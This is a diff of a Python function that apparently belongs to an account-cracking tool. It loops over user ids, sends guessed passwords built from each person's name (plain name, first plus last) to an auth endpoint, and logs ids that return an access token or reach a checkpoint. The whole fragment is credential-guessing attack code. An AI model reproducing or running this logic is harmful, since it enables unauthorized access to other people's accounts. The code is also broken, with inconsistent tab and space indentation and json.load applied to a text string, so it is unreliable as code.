@@ -440,7 +440,7 @@ def pilih_super():
 		except OSError:
 			pass #Dev:Jam
 		try:
-			pass1 = name.lower() + p1
+			pass1 = name
 			data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
 		        q = json.load(data)
 			if 'access_token' in q:
@@ -454,7 +454,7 @@ def pilih_super():
 					cek.close()
 					cekpoint.append(uid+pass1)
 				else:
-					pass2 = name.lower() + p2
+					pass2 = first + last
 					data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
 		                        q = json.load(data)
 					if 'access_token' in q:
@@ -468,7 +468,7 @@ def pilih_super():
 							cek.close()
 							cekpoint.append(uid+pass2)
 						else:
-							pass3 = name.lower() + p3
+							pass3 = first+last
 							data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
 		                                        q = json.load(data)
 							if 'access_token' in q:
